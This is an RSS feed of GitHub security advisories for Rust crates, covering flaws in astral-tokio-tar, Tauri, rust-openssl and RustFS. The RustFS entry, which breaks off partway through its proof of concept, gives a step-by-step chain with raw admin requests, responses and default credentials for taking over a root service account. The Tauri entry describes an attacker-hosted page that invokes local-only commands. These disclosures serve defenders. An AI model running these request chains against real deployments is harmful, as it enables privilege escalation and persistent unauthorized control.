<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/rust.rss</id>
    <title>Security Advisory for Rust crates</title>
    <updated>2026-05-06T18:28:08.714Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
    <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[astral-tokio-tar] astral-tokio-tar: `unpack_in` can chmod arbitrary directories by following symlinks]]></title>
        <id>https://github.com/advisories/GHSA-xx64-wwv2-hcqq</id>
        <link href="https://github.com/advisories/GHSA-xx64-wwv2-hcqq"/>
        <updated>2026-05-06T17:26:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In versions 0.6.0 and earlier of astral-tokio-tar, the <code>unpack_in</code> API could inadvertently modify the permissions of external (i.e. non-archive) directories outside of the archive. An attacker could use this to contrite a tar archive that maliciously changes directory permissions outside of its intended hierarchy. This flaw only affects directories; individual file permissions cannot be modified via it.</p>
<p>See GHSA-j4xf-2g29-59ph for the equivalent flaw in the <code>tar</code> crate.</p>
<h3 id="patches">Patches</h3>
<p>Versions 0.6.1 and newer of astral-tokio-tar use <code>fs::symlink_metdata</code> rather than <code>fs::metadata</code>, avoiding the traversal. </p>
<h3 id="workarounds">Workarounds</h3>
<p>Users are advised to upgrade to version 0.6.1 or newer to address this advisory.</p>
<p>Users should experience no breaking changes as a result of the patch above.</p>
<h3 id="resources">Resources</h3>
<ul>
<li>GHSA-j4xf-2g29-59ph for the original <code>tar</code> vulnerability</li>
</ul>
<h3 id="attribution">Attribution</h3>
<ul>
<li>Reporter: Adam Harvey (@lawngnome)</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/astral-sh/tokio-tar/security/advisories/GHSA-xx64-wwv2-hcqq">https://github.com/astral-sh/tokio-tar/security/advisories/GHSA-xx64-wwv2-hcqq</a></li>
<li><a href="https://github.com/advisories/GHSA-xx64-wwv2-hcqq">https://github.com/advisories/GHSA-xx64-wwv2-hcqq</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0113.html">https://rustsec.org/advisories/RUSTSEC-2026-0113.html</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xx64-wwv2-hcqq</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-06T17:26:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[astral-tokio-tar] astral-tokio-tar is Vulnerable to PAX Header Desynchronization]]></title>
        <id>https://github.com/advisories/GHSA-fp55-jw48-c537</id>
        <link href="https://github.com/advisories/GHSA-fp55-jw48-c537"/>
        <updated>2026-05-06T17:26:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Versions of astral-tokio-tar prior to 0.6.1 contain a PAX header interpretation bug that allows manipulated entries to be made selectively visible or invisible during extraction with astral-tokio-tar versus other tar implementations. An attacker could use this differential to smuggle unexpected files onto a victim's filesystem.</p>
<p>See GHSA-j5gw-2vrg-8fgx for a similar desynchronization bug in astral-tokio-tar.</p>
<h3 id="patches">Patches</h3>
<p>Versions 0.6.1 and newer of astral-tokio-tar address this differential.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Users are advised to upgrade to version 0.6.1 or newer to address this advisory.</p>
<p>There is no workaround other than upgrading. Users should experience no breaking changes as a result of the upgrade.</p>
<h3 id="resources">Resources</h3>
<ul>
<li>GHSA-j5gw-2vrg-8fgx is a similar PAX desynchronization bug</li>
</ul>
<h3 id="attribution">Attribution</h3>
<ul>
<li>Reporter: Adam Harvey (@lawngnome)</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/astral-sh/tokio-tar/security/advisories/GHSA-fp55-jw48-c537">https://github.com/astral-sh/tokio-tar/security/advisories/GHSA-fp55-jw48-c537</a></li>
<li><a href="https://github.com/advisories/GHSA-fp55-jw48-c537">https://github.com/advisories/GHSA-fp55-jw48-c537</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0112.html">https://rustsec.org/advisories/RUSTSEC-2026-0112.html</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fp55-jw48-c537</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-06T17:26:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tauri] Tauri has an Origin Confusion Issue that Allows Remote Pages to Invoke Local-Only IPC Commands]]></title>
        <id>https://github.com/advisories/GHSA-7gmj-67g7-phm9</id>
        <link href="https://github.com/advisories/GHSA-7gmj-67g7-phm9"/>
        <updated>2026-05-06T16:58:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A flaw in Tauri's <code>is_local_url()</code> function causes it to incorrectly classify remote URLs as trusted local origins on Windows and Android. On these systems, Tauri maps custom URI scheme protocols to <code>http://&lt;scheme&gt;.localhost/</code> because those platforms' WebView implementations cannot serve custom URI schemes directly.</p>
<p>The issue is that Tauri's check to see if the origin is local, only checks the first subdomain of the URL. An attacker can abuse this by hosting a page on a domain whose subdomain matches the custom scheme of the application (e.g. <a href="http://app.attacker.com/">http://app.attacker.com/</a>)."</p>
<p>Example:</p>
<ul>
<li>Local URL: <code>app://localhost/</code> → on Android/Windows: <code>http://app.localhost/</code></li>
<li>The check passes for any URL starting with <code>http://app.</code>, including <code>http://app.evil.com/</code></li>
</ul>
<p>As a result, the attacker page can invoke backend commands that the developer intended to be accessible only to the app's own frontend and that are explicitly restricted from being called by external or remote origins.</p>
<h3 id="details">Details</h3>
<p>Vulnerable function:</p>
<pre><code class="language-rust">#[cfg(any(windows, target_os = "android"))]
let local = {
  let protocol_url = self.manager().tauri_protocol_url(uses_https);
  let maybe_protocol = current_url
    .domain()
    .and_then(|d| d.split_once('.'))  // BUG: only splits on first dot
    .unwrap_or_default()
    .0;

  protocols.contains_key(maybe_protocol) &amp;&amp; scheme == protocol_url.scheme()
};
</code></pre>
<p>Link: <a href="https://github.com/tauri-apps/tauri/blob/1ef6a119b1571d1da0acc08bdb7fd5521a4c6d52/crates/tauri/src/webview/mod.rs#L1680">https://github.com/tauri-apps/tauri/blob/1ef6a119b1571d1da0acc08bdb7fd5521a4c6d52/crates/tauri/src/webview/mod.rs#L1680</a></p>
<p><code>split_once('.')</code> discards everything after the first <code>.</code>. For <a href="http://app.evil.com/">http://app.evil.com/</a>, the extracted label is app. If the application has registered a protocol named app, <code>protocols.contains_key("app")</code> returns <code>true</code> and the URL is classified as <code>Origin::Local</code>. The correct check must assert the full domain is exactly <code>&lt;protocol&gt;.localhost</code>.</p>
<h3 id="poc">PoC</h3>
<p>We created a proof of concept app that can be found <a href="https://drive.google.com/file/d/1YME6YMSKv69JxFF7Ne0OrZ6tGC_OH7Jw/view?usp=sharing">here</a>. The app registers a custom app:// protocol and exposes a ping command restricted to local origins only. It provides a button to open a URL in a WebView, pre-filled with <a href="https://app.robbe-bc9.workers.dev/">https://app.robbe-bc9.workers.dev/</a>, an attacker-controlled page that invokes ping on load. Because the domain's first label matches the registered app protocol, is_local_url() classifies it as a local origin and the command succeeds.</p>
<p><code>capabilities/main.json</code> contains the following code, which only exposes <code>ping</code> locally:</p>
<pre><code class="language-json">{
  "$schema": "../../../crates/tauri-schema-generator/schemas/capability.schema.json",
  "identifier": "main",
  "local": true,
  "windows": ["*"],
  "permissions": [
    "sample:allow-ping"
  ]
}
</code></pre>
<p><code>src/lib.rs</code> contains the following code, to register a custom scheme:</p>
<pre><code class="language-rust">tauri::Builder::default()
  .register_uri_scheme_protocol("app", |_ctx, _request| { ... })
</code></pre>
<h3 id="impact">Impact</h3>
<p>The attacker page can invoke backend commands that the developer intended to be accessible only to the app's own frontend and that are explicitly restricted from being called by external or remote origins.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tauri-apps/tauri/security/advisories/GHSA-7gmj-67g7-phm9">https://github.com/tauri-apps/tauri/security/advisories/GHSA-7gmj-67g7-phm9</a></li>
<li><a href="https://github.com/advisories/GHSA-7gmj-67g7-phm9">https://github.com/advisories/GHSA-7gmj-67g7-phm9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7gmj-67g7-phm9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-06T16:58:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openssl] rust-openssl has undefined behavior in X509Ref::ocsp_responders for certificates with non-UTF-8 OCSP URLs]]></title>
        <id>https://github.com/advisories/GHSA-xp3w-r5p5-63rr</id>
        <link href="https://github.com/advisories/GHSA-xp3w-r5p5-63rr"/>
        <updated>2026-05-05T21:46:40.000Z</updated>
        <content type="html"><![CDATA[<p><code>X509Ref::ocsp_responders</code> returns OCSP responder URLs from a certificate's AIA extension as <code>OpensslString</code>, whose <code>Deref&lt;Target = str&gt;</code> wraps the raw bytes with <code>str::from_utf8_unchecked</code>. OpenSSL does not enforce that the underlying IA5String is ASCII, so a certificate with non-UTF-8 bytes in its OCSP accessLocation causes safe Rust code to construct a <code>&amp;str</code> that violates the UTF-8 invariant — resulting in undefined behavior.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rust-openssl/rust-openssl/security/advisories/GHSA-xp3w-r5p5-63rr">https://github.com/rust-openssl/rust-openssl/security/advisories/GHSA-xp3w-r5p5-63rr</a></li>
<li><a href="https://github.com/advisories/GHSA-xp3w-r5p5-63rr">https://github.com/advisories/GHSA-xp3w-r5p5-63rr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xp3w-r5p5-63rr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T21:46:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rustfs] RustFS: ListServiceAccount authorizes against wrong admin action, enabling cross-user enumeration and root service account takeover]]></title>
        <id>https://github.com/advisories/GHSA-mm2q-qcmx-gw4w</id>
        <link href="https://github.com/advisories/GHSA-mm2q-qcmx-gw4w"/>
        <updated>2026-05-05T20:14:17.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>ListServiceAccount</code> (<code>GET /rustfs/admin/v3/list-service-accounts?user=&lt;other&gt;</code>) authorizes cross-user requests against <code>UpdateServiceAccountAdminAction</code> instead of <code>ListServiceAccountsAdminAction</code> at <code>rustfs/src/admin/handlers/service_account.rs:936</code>. The handler accepts the <strong>wrong</strong> admin action and rejects the <strong>correct</strong> one:</p>
<ul>
<li>A user granted only <code>admin:UpdateServiceAccount</code> enumerates every service account in the cluster, including the root user's (HTTP 200, full metadata).</li>
<li>A user granted only <code>admin:ListServiceAccounts</code> — the permission name every IAM document treats as "list service accounts" — receives HTTP 403 AccessDenied on the same request.</li>
</ul>
<p>Because service account access keys act as the identifier a <code>UpdateServiceAccount</code> holder needs to rotate a secret, and the <code>UpdateServiceAccount</code> handler at <code>rustfs/src/admin/handlers/service_account.rs:489</code> performs no ownership check on the target access key, leaking those access keys lets a delegated "service account updater" role overwrite <code>root-sa-1</code>'s secret, authenticate as the root user's service account, and create a persistent backdoor admin with <code>admin:*</code> + <code>s3:*</code>. Proven live end-to-end against <code>rustfs/rustfs:latest</code> (1.0.0-alpha.91, revision <code>d4ea14c2</code>) — the same revision is byte-identical on current <code>origin/main</code>.</p>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<ul>
<li><strong>Package:</strong> <code>rustfs</code> (binary crate <code>rustfs</code>)</li>
<li><strong>Affected versions:</strong> From <code>0a2411f</code> (the initial <code>service_account.rs</code> check-in on 2026-03-15) through current HEAD <code>90e584a</code>. The vulnerable line has never been touched.</li>
<li><strong>Fixed versions:</strong> None</li>
<li><strong>Vulnerable file:</strong> <code>rustfs/src/admin/handlers/service_account.rs</code></li>
<li><strong>Vulnerable route:</strong> <code>GET /rustfs/admin/v3/list-service-accounts?user=&lt;other_user&gt;</code> (<code>ListServiceAccount::call</code>)</li>
<li><strong>CWE:</strong> CWE-863 (Incorrect Authorization), chained with CWE-620 (Unverified Password Change) to reach CWE-269 (Improper Privilege Management)</li>
<li><strong>CVSS (demonstrated chain to full admin):</strong> <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H</code> = <strong>10.0 Critical</strong>. If scored as Scope:Unchanged the vector is <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code> = <strong>8.8 High</strong>. The list bug alone (no chain) is <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</code> = <strong>6.5 Medium</strong> and is what a maintainer would rate it if the Update ownership gap is out of scope for this report.</li>
</ul>
<h2 id="two-distinct-vulnerabilities">Two Distinct Vulnerabilities</h2>
<p>This report documents two bugs that chain to full RustFS administrative takeover. Each is independently fixable and independently a security issue:</p>
<p><strong>Vulnerability A — Wrong action constant in ListServiceAccount (CWE-863)</strong>
<code>ListServiceAccount::call</code> at line 936 checks <code>UpdateServiceAccountAdminAction</code> instead of <code>ListServiceAccountsAdminAction</code>. This is a copy-paste typo: the three sibling list handlers (lines 658, 799, 1095) all use the correct constant. The result is a permission inversion — the correct permission (<code>admin:ListServiceAccounts</code>) is rejected, and the wrong one (<code>admin:UpdateServiceAccount</code>) is accepted. Independently, this is a Medium-severity cross-user information disclosure.</p>
<p><strong>Vulnerability B — Missing ownership check in UpdateServiceAccount (CWE-620)</strong>
<code>UpdateServiceAccount::call</code> at lines 489-614 authorizes on possession of <code>admin:UpdateServiceAccount</code> but never verifies the target <code>?accessKey=</code> belongs to the caller or the caller's parent. Lines 522-525 contain a commented-out <code>get_service_account</code> call that would have loaded the target for such a check. This means any holder of <code>admin:UpdateServiceAccount</code> can overwrite any service account's secret in the cluster, regardless of ownership.</p>
<p><strong>Chain (A + B) — Full RustFS administrative takeover</strong>
Vulnerability A leaks every service account's access key (including the root administrator's). Vulnerability B allows overwriting any SA's secret given its access key. Together: a user with a single permission (<code>admin:UpdateServiceAccount</code>) enumerates the root user's SA access key via the wrong-action list bug, overwrites its secret via the ownership-free update handler, authenticates as the root user's service account, and creates a persistent backdoor admin with full RustFS administrative control.</p>
<p><strong>Authorization mismatch at a glance:</strong></p>
<p>Exact policies attached to each test identity (retrieved from running server via <code>GET /admin/v3/info-canned-policy</code>):</p>
<pre><code>    legit-list-pol      -&gt; {"Action": ["admin:ListServiceAccounts"],  "Resource": ["arn:aws:s3:::*"]}
    list-sa-probe-pol   -&gt; {"Action": ["admin:UpdateServiceAccount"], "Resource": ["arn:aws:s3:::*"]}
    list-sa-restricted  -&gt; {"Action": ["admin:UpdateServiceAccount"], "Resource": ["arn:aws:s3:::probe-scope/*"]}
    (zero-priv-user has no attached policy)
</code></pre>
<table>
<thead>
<tr>
<th>Identity</th>
<th>Attached policy</th>
<th><code>GET /list-service-accounts?user=rustfsadmin</code></th>
<th>Expected</th>
</tr>
</thead>
<tbody><tr>
<td><code>probe-user</code></td>
<td><code>list-sa-probe-pol</code> (<code>admin:UpdateServiceAccount</code>)</td>
<td><strong>200</strong> (full SA metadata)</td>
<td>403</td>
</tr>
<tr>
<td><code>legit-list-user</code></td>
<td><code>legit-list-pol</code> (<code>admin:ListServiceAccounts</code>)</td>
<td><strong>403</strong> AccessDenied</td>
<td>200</td>
</tr>
<tr>
<td><code>restricted-update-user</code></td>
<td><code>list-sa-restricted</code> (<code>admin:UpdateServiceAccount</code> on <code>probe-scope/*</code>)</td>
<td><strong>200</strong></td>
<td>403</td>
</tr>
<tr>
<td><code>zero-priv-user</code></td>
<td>(none)</td>
<td><strong>403</strong></td>
<td>403</td>
</tr>
<tr>
<td>(unauthenticated)</td>
<td>n/a</td>
<td><strong>403</strong> Signature required</td>
<td>403</td>
</tr>
</tbody></table>
<h3 id="why-the-correct-permission-gets-403">Why the correct permission gets 403</h3>
<p>The handler at line 936 calls <code>is_allowed</code> with the action <code>AdminAction::UpdateServiceAccountAdminAction</code>. The IAM engine performs an exact string match between the action in the <code>is_allowed</code> call (<code>admin:UpdateServiceAccount</code>) and the action in the caller's attached policy:</p>
<ul>
<li><code>legit-list-user</code> has policy action <code>admin:ListServiceAccounts</code>. This does <strong>not</strong> match <code>admin:UpdateServiceAccount</code>. <code>is_allowed</code> returns false. The handler returns 403. The user who holds the <em>correct</em> permission for listing service accounts is denied.</li>
<li><code>probe-user</code> has policy action <code>admin:UpdateServiceAccount</code>. This <strong>matches</strong> <code>admin:UpdateServiceAccount</code>. <code>is_allowed</code> returns true. The handler returns 200. The user who holds a <em>different, unrelated</em> permission is granted access to a list endpoint.</li>
<li><code>restricted-update-user</code> has the same action string but resource-scoped to <code>arn:aws:s3:::probe-scope/*</code>. Admin-action statements skip resource matching (<code>crates/policy/src/policy/statement.rs:132</code>: <code>&amp;&amp; !self.is_admin() &amp;&amp; !self.is_sts()</code>), so the resource restriction is ignored and <code>is_allowed</code> still returns true.</li>
</ul>
<p>There is no wildcard, superset, or inheritance relationship between these two action strings. They are separate enum variants (<code>crates/policy/src/policy/action.rs:459-462</code>) with distinct <code>strum(serialize)</code> values. The IAM engine is working correctly; the handler passes the wrong action to it.</p>
<p>Raw request/response for <code>legit-list-user</code> (the counterintuitive 403):</p>
<pre><code>    GET /rustfs/admin/v3/list-service-accounts?user=rustfsadmin  HTTP/1.1
    Authorization: AWS4-HMAC-SHA256 Credential=legit-list-user/...

    HTTP/1.1 403
    &lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;Error&gt;&lt;Code&gt;AccessDenied&lt;/Code&gt;&lt;Message&gt;access denied&lt;/Message&gt;&lt;/Error&gt;
</code></pre>
<p><strong>Why this is not "working as intended":</strong></p>
<ul>
<li><code>admin:UpdateServiceAccount</code> and <code>admin:ListServiceAccounts</code> are distinct enum variants with distinct string representations. The codebase treats them as orthogonal permissions.</li>
<li>Three sibling list handlers in the same file (lines 658, 799, 1095) all check <code>ListServiceAccountsAdminAction</code>. Only line 936 deviates.</li>
<li>CVE-2026-22042 / GHSA-vcwh-pff9-64cc is the maintainers' own precedent: <code>ImportIam</code> checking <code>ExportIAMAction</code> was rated Medium and fixed. The same class of bug applies here.</li>
<li>A zero-privilege user (no admin policies at all) cannot exploit either vulnerability — both handlers correctly enforce their respective <code>is_allowed</code> checks. The bug is that the list handler enforces the <em>wrong</em> action constant, not that it skips enforcement entirely.</li>
</ul>
<h2 id="root-cause--vulnerability-a-wrong-action-constant">Root Cause — Vulnerability A (Wrong Action Constant)</h2>
<p><code>ListServiceAccount::call</code> is registered for <code>GET /rustfs/admin/v3/list-service-accounts</code> at <code>rustfs/src/admin/handlers/service_account.rs:137-141</code>. The cross-user branch (entered when <code>?user=&lt;x&gt;</code> does not match the caller) checks the wrong admin action:</p>
<pre><code>// rustfs/src/admin/handlers/service_account.rs:931-953  (HEAD 90e584a, identical at d4ea14c2)
let target_account = if query.user.as_ref().is_some_and(|v| v != &amp;cred.access_key) {
    if !iam_store
        .is_allowed(&amp;Args {
            account: &amp;cred.access_key,
            groups: &amp;cred.groups,
            action: Action::AdminAction(AdminAction::UpdateServiceAccountAdminAction), // WRONG
            bucket: "",
            conditions: &amp;get_condition_values(...),
            is_owner: owner,
            object: "",
            claims: cred.claims.as_ref().unwrap_or(&amp;HashMap::new()),
            deny_only: false,
        })
        .await
    {
        return Err(s3_error!(AccessDenied, "access denied"));
    }
    query.user.unwrap_or_default()
} else if cred.parent_user.is_empty() {
    cred.access_key
} else {
    cred.parent_user
};
</code></pre>
<p>The action enum definitions are cleanly distinct at <code>crates/policy/src/policy/action.rs:459-464</code>:</p>
<pre><code>#[strum(serialize = "admin:CreateServiceAccount")] CreateServiceAccountAdminAction,
#[strum(serialize = "admin:UpdateServiceAccount")] UpdateServiceAccountAdminAction,
#[strum(serialize = "admin:RemoveServiceAccount")] RemoveServiceAccountAdminAction,
#[strum(serialize = "admin:ListServiceAccounts")]  ListServiceAccountsAdminAction,
</code></pre>
<p>Every <em>other</em> list handler in the same file authorizes on the correct constant:</p>
<pre><code>rustfs/src/admin/handlers/service_account.rs:658   InfoServiceAccount::call   -&gt; ListServiceAccountsAdminAction
rustfs/src/admin/handlers/service_account.rs:799   InfoAccessKey::call        -&gt; ListServiceAccountsAdminAction
rustfs/src/admin/handlers/service_account.rs:1095  ListAccessKeysBulk::call   -&gt; ListServiceAccountsAdminAction
</code></pre>
<p>Only <code>ListServiceAccount::call</code> at line 936 deviates. This is a typo/wiring error, not a design choice.</p>
<p><code>git blame</code> shows the line has been wrong since commit <code>0a2411f</code> (heihutu, 2026-03-15), the initial check-in of <code>service_account.rs</code>.</p>
<h2 id="root-cause--vulnerability-b-missing-ownership-check-in-update">Root Cause — Vulnerability B (Missing Ownership Check in Update)</h2>
<p>Service account access keys are the identifier the <code>UpdateServiceAccount</code> handler accepts via the <code>?accessKey=</code> query string. Inspecting <code>UpdateServiceAccount::call</code> at <code>rustfs/src/admin/handlers/service_account.rs:489-614</code>:</p>
<pre><code>let access_key = query.access_key;                                // line 509
...
if !iam_store.is_allowed(&amp;Args {
    account: &amp;cred.access_key,
    action: Action::AdminAction(AdminAction::UpdateServiceAccountAdminAction),
    ...
}).await { return Err(s3_error!(AccessDenied, "access denied")); } // line 538-559
...
let updated_at = iam_store.update_service_account(&amp;access_key, opts).await  // line 579
    .map_err(...)?;
</code></pre>
<p>The handler authorizes on <em>possession of</em> <code>admin:UpdateServiceAccount</code> and <strong>never checks</strong> that the <code>?accessKey=</code> query parameter resolves to a service account owned by the caller. Notably, lines 522-525 contain a commented-out <code>get_service_account</code> call that would have loaded the target SA for an ownership check — it was present in the initial commit and has been commented out since:</p>
<pre><code>// let svc_account = iam_store.get_service_account(&amp;access_key).await.map_err(|e| {
//     debug!("get service account failed, e: {:?}", e);
//     s3_error!(InternalError, "get service account failed")
// })?;
</code></pre>
<p>The inner <code>IamSys::update_service_account</code> at <code>crates/iam/src/sys.rs:495-501</code> delegates to <code>IamCache::update_service_account</code> at <code>crates/iam/src/manager.rs:663</code> which loads the credentials by access-key name, verifies it is a service account, and overwrites <code>secret_key</code> — again, no ownership check:</p>
<pre><code>// crates/iam/src/manager.rs:663
pub async fn update_service_account(&amp;self, name: &amp;str, opts: UpdateServiceAccountOpts) -&gt; Result&lt;OffsetDateTime&gt; {
    let Some(ui) = self.cache.users.load().get(name).cloned() else {
        return Err(Error::NoSuchServiceAccount(name.to_string()));
    };
    ...
    let mut cr = ui.credentials.clone();
    let current_secret_key = cr.secret_key.clone();

    if let Some(secret) = opts.secret_key {
        if !is_secret_key_valid(&amp;secret) {
            return Err(Error::InvalidSecretKeyLength);
        }
        cr.secret_key = secret;                // &lt;-- attacker-chosen
    }
    ...
</code></pre>
<p>So a holder of <code>admin:UpdateServiceAccount</code> who knows <em>any</em> service account's access key can overwrite its secret. The list bug at line 936 hands them every access key in the cluster, including <code>root-sa-1</code>.</p>
<p>The two bugs together form a clean chain:</p>
<ol>
<li>Attacker has a single admin permission: <code>admin:UpdateServiceAccount</code>.</li>
<li>Attacker calls <code>GET /v3/list-service-accounts?user=rustfsadmin</code> — vulnerable handler grants access.</li>
<li>Attacker reads <code>accessKey=root-sa-1</code> out of the response.</li>
<li>Attacker calls <code>POST /v3/update-service-account?accessKey=root-sa-1</code> with body <code>{"newSecretKey":"..."}</code> — ownership-less handler overwrites.</li>
<li>Attacker authenticates as <code>root-sa-1</code> with the chosen secret and inherits the root user's full <code>admin:*</code> + <code>s3:*</code> authority.</li>
</ol>
<h2 id="environment-and-version-alignment">Environment and Version Alignment</h2>
<ul>
<li><p>Image: <code>rustfs/rustfs:latest</code>, digest <code>sha256:74f8eaad96124c7e019bedfb892b41a9429c495f57b883182427c5e9e9d53c6a</code></p>
</li>
<li><p>Labels: <code>org.opencontainers.image.version=1.0.0-alpha.91</code>, <code>org.opencontainers.image.revision=d4ea14c2ba99602314511d5862005f7b871ece37</code>, <code>org.opencontainers.image.build-type=prerelease</code></p>
</li>
<li><p>Source verification:</p>
<pre><code>  $ git show d4ea14c2:rustfs/src/admin/handlers/service_account.rs | sed -n '931,940p'
          let target_account = if query.user.as_ref().is_some_and(|v| v != &amp;cred.access_key) {
              if !iam_store
                  .is_allowed(&amp;Args {
                      account: &amp;cred.access_key,
                      groups: &amp;cred.groups,
                      action: Action::AdminAction(AdminAction::UpdateServiceAccountAdminAction),
                      bucket: "",
                      ...

  $ git show origin/main:rustfs/src/admin/handlers/service_account.rs | sed -n '931,940p'
          let target_account = if query.user.as_ref().is_some_and(|v| v != &amp;cred.access_key) {
              if !iam_store
                  .is_allowed(&amp;Args {
                      account: &amp;cred.access_key,
                      groups: &amp;cred.groups,
                      action: Action::AdminAction(AdminAction::UpdateServiceAccountAdminAction),
                      bucket: "",
                      ...
</code></pre>
</li>
</ul>
<p>Byte-identical. The shipped image contains the same vulnerable handler as the tip of main.</p>
<h2 id="proof-of-concept-executed-live">Proof of Concept (executed live)</h2>
<h3 id="environment">Environment</h3>
<pre><code>    docker run -d --name rustfs-poc --memory=2g -p 9100:9000 \
        -e RUSTFS_ACCESS_KEY=rustfsadmin -e RUSTFS_SECRET_KEY=rustfsadmin \
        rustfs/rustfs:latest
</code></pre>
<p>Root credentials: <code>rustfsadmin:rustfsadmin</code>.</p>
<h3 id="step-1--provision-the-probe-identity">Step 1 — Provision the probe identity</h3>
<p>The probe policy grants exactly <strong>one</strong> admin action, scoped to the broadest resource. Nothing else.</p>
<pre><code>    {
      "Version": "2012-10-17",
      "Statement": [
        {
          "Effect": "Allow",
          "Action": ["admin:UpdateServiceAccount"],
          "Resource": ["arn:aws:s3:::*"]
        }
      ]
    }
</code></pre>
<p>Creation as root:</p>
<pre><code>    PUT /rustfs/admin/v3/add-canned-policy?name=list-sa-probe-pol        -&gt; 200
    PUT /rustfs/admin/v3/add-user?accessKey=probe-user                   -&gt; 200  (secret: probe-secret1234)
    PUT /rustfs/admin/v3/set-user-or-group-policy?userOrGroup=probe-user&amp;isGroup=false&amp;policyName=list-sa-probe-pol -&gt; 200
    PUT /rustfs/admin/v3/add-user?accessKey=victim-user                  -&gt; 200  (no policy)
    PUT /rustfs/admin/v3/add-service-accounts                            -&gt; 200  (creates victim-sa-1 under victim-user)
    PUT /rustfs/admin/v3/add-service-accounts                            -&gt; 200  (creates root-sa-1 under rustfsadmin)
</code></pre>
<h3 id="step-2--baseline-probe-user-is-actually-constrained">Step 2 — Baseline: probe-user is actually constrained</h3>
<p>Confirming <code>probe-user</code> is denied on unrelated admin endpoints so the "200 on list-service-accounts" is not the side effect of some ambient privilege:</p>
<pre><code>    GET /rustfs/admin/v3/list-users                 as probe-user -&gt; 403 AccessDenied
    GET /rustfs/admin/v3/info                       as probe-user -&gt; 403 AccessDenied
    GET /rustfs/admin/v3/list-canned-policies       as probe-user -&gt; 403 AccessDenied
    GET /rustfs/admin/v3/kms/status                 as probe-user -&gt; 403 AccessDenied
    PUT /rustfs/admin/v3/add-canned-policy?name=... as probe-user -&gt; 403 AccessDenied
    GET /rustfs/admin/v3/list-service-accounts      as probe-user -&gt; 200 {"accounts":[]}  # self-scope OK
</code></pre>
<p>The self-scope list (no <code>user=</code> query) returns an empty array — the caller's own service account inventory, which is correctly allowed. This isolates the bug to the cross-user branch only.</p>
<h3 id="step-3--primary-exploit-enumerate-other-users-service-accounts">Step 3 — Primary exploit: enumerate other users' service accounts</h3>
<pre><code>    GET /rustfs/admin/v3/list-service-accounts?user=victim-user  as probe-user -&gt; 200
    {"accounts":[{"parentUser":"victim-user","accountStatus":"on","impliedPolicy":true,"accessKey":"victim-sa-1","name":"sa-victim-user-victim-sa-1","description":"probe target SA for user victim-user","expiration":null}]}

    GET /rustfs/admin/v3/list-service-accounts?user=rustfsadmin  as probe-user -&gt; 200
    {"accounts":[{"parentUser":"rustfsadmin","accountStatus":"on","impliedPolicy":true,"accessKey":"root-sa-1","name":"sa-rustfsadmin-root-sa-1","description":"probe target SA for user rustfsadmin","expiration":null}]}
</code></pre>
<p>Exposed per entry: <code>parentUser</code>, <code>accountStatus</code>, <code>impliedPolicy</code>, <strong><code>accessKey</code></strong>, <code>name</code>, <code>description</code>, <code>expiration</code>. The response does not leak secret keys or session tokens (those are cleared server-side), but it does leak the <code>accessKey</code> — the identifier that the <code>UpdateServiceAccount</code> endpoint consumes via <code>?accessKey=</code>.</p>
<h3 id="step-4--differential-the-correct-permission-gets-denied">Step 4 — Differential: the correct permission gets denied</h3>
<p>Created <code>legit-list-user</code> with a policy granting only <code>admin:ListServiceAccounts</code>:</p>
<pre><code>    {
      "Version": "2012-10-17",
      "Statement": [
        {
          "Effect": "Allow",
          "Action": ["admin:ListServiceAccounts"],
          "Resource": ["arn:aws:s3:::*"]
        }
      ]
    }
</code></pre>
<p>Running the same request:</p>
<pre><code>    GET /rustfs/admin/v3/list-service-accounts?user=rustfsadmin  as legit-list-user -&gt; 403
    &lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;Error&gt;&lt;Code&gt;AccessDenied&lt;/Code&gt;&lt;Message&gt;access denied&lt;/Message&gt;&lt;/Error&gt;
</code></pre>
